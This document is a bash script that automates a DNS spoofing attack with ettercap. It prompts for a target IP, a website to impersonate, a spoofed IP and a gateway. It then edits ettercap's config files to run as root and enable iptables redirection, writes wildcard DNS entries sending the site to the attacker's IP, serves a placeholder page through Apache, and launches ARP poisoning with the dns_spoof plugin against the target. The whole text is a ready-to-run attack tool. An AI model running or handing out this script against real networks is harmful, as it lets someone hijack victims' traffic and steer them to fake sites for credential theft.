 #!/usr/bin/bash
figlet DNS Spoofing
echo "                                                          "
echo "----------------------------------------------------------"
echo "This attack uses ettercap 0.8.2 , so make sure you have it"
echo "----------------------------------------------------------"
echo "                                                          "
echo "Enter target ip:"
read tip
echo "Enter legitimate website name to spoof:"
read site
echo "Enter the spoofed ip:"
read sip
echo "Enter the gateway ip:"
read gip
sed -i -e 's/ec_uid = [0-9]*/ec_uid = 0/' /etc/ettercap/etter.conf
sed -i -e 's/ec_gid = [0-9]*/ec_gid = 0/' /etc/ettercap/etter.conf
sed -i -e 's/#redir_command_on = "iptables/redir_command_on = "iptables/' /etc/ettercap/etter.conf
sed -i -e 's/#redir_command_off = "iptables/redir_command_off = "iptables/' /etc/ettercap/etter.conf
sed -i -e "59 s/^[a-zA-Z0-9.]*/$site/" /etc/ettercap/etter.dns
sed -i -e "59 s/[0-9.]*$/$sip/" /etc/ettercap/etter.dns
sed -i -e "60 s/^[*a-zA-Z0-9.]*/*.$site/" /etc/ettercap/etter.dns
sed -i -e "60 s/[0-9.]*$/$sip/" /etc/ettercap/etter.dns
sed -i -e "61 s/^[*a-zA-Z0-9.]*/www.$site/" /etc/ettercap/etter.dns
sed -i -e "61 s/      # Wildcards in PTR are not allowed//" /etc/ettercap/etter.dns
sed -i -e "61 s/[0-9.]*$/$sip/" /etc/ettercap/etter.dns
echo "<h1>DNS SPOOFING SUCCESSFULL<h1>" > /var/www/html/index.html
service apache2 restart
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /$gip// /$tip//
